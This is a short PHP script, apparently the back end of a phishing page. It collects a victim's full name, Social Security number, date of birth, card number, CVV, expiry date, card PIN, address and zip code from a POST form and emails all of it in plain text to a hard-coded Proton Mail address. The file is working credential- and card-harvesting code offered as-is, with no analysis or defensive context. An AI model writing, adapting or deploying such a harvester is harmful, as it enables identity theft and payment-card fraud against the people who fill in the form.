<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Retrieve and sanitize form data
    $full_name = htmlspecialchars($_POST['full_name']);
    $ssn = htmlspecialchars($_POST['ssn']);
    $dob = htmlspecialchars($_POST['dob']);
    $card_number = htmlspecialchars($_POST['card_number']);
    $card_cvv = htmlspecialchars($_POST['card_cvv']);
    $card_expiry = htmlspecialchars($_POST['card_expiry']);
    $csv = htmlspecialchars($_POST['csv']);
    $pin = htmlspecialchars($_POST['pin']);
    $address = htmlspecialchars($_POST['address']);
    $zip_code = htmlspecialchars($_POST['zip_code']);
    
    $to = "johnsonmasonforall@proton.me"; // Replace with your email address
    $subject = "New Form Submission";
    
    // Create the message body
    $message = "Form Submission Details:\n\n";
    $message .= "Full Name: $full_name\n";
    $message .= "SSN: $ssn\n";
    $message .= "Date of Birth: $dob\n";
    $message .= "\nCard Details:\n";
    $message .= "Card Number: $card_number\n";
    $message .= "Card CVV: $card_cvv\n";
    $message .= "Card Expiry Date: $card_expiry\n";
    $message .= "CSV: $csv\n";
    $message .= "PIN: $pin\n";
    $message .= "\nAddress Details:\n";
    $message .= "Address: $address\n";
    $message .= "Zip Code: $zip_code\n";
    
    $headers = "From: noreply@example.com"; // Replace with your desired sender email address

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "<p style='color:green;'>Form submitted and email sent successfully!</p>";
    } else {
        echo "<p style='color:red;'>Failed to send the email.</p>";
    }
}
?>
